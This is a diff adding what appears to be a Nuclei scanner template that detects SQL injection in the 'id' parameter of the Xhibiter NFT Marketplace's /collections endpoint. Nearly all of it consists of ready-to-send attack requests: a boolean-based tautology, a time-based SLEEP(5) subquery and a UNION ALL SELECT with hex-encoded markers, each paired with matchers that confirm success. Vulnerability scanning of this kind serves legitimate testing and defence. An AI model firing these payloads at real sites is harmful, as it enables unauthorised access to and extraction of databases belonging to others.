@@ -1,0 +1,58 @@
+http:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - 4182=4182
+  - part: body
+    type: word
+    words:
+    - rNfD=rNfD
+  matchers-condition: and
+  raw:
+  - 'GET /collections?id=2'' AND 4182=4182 AND ''rNfD''=''rNfD HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+- matchers:
+  - dsl:
+    - status_code == 200
+    - duration > 5
+    type: dsl
+  matchers-condition: and
+  raw:
+  - 'GET /collections?id=2'' AND (SELECT 1492 FROM (SELECT(SLEEP(5)))HsLV) AND ''KEOa''=''KEOa
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+- matchers:
+  - part: body
+    type: word
+    words:
+    - qbbbq
+    - eTeuLPRMhOvIDCDXbNNYlaKmJVeIViFmKpCbfkX
+  matchers-condition: and
+  raw:
+  - 'GET /collections?id=2'' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162626271,0x655465754c50524d684f764944434458624e4e596c614b6d4a56656f495669466d4b704362666b58,0x71716a6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+id: xhibiter-nft-sqli
+info:
+  author: ProjectDiscoveryAI
+  description: 'Xhibiter NFT Marketplace suffers from SQL Injection vulnerability
+    in the ''id'' parameter.
+
+    The vulnerability allows attackers to execute various types of SQL injection attacks
+    including
+
+    boolean-based blind, time-based blind, and UNION query injections.
+
+    '
+  name: Xhibiter NFT Marketplace SQL Injection
+  severity: high
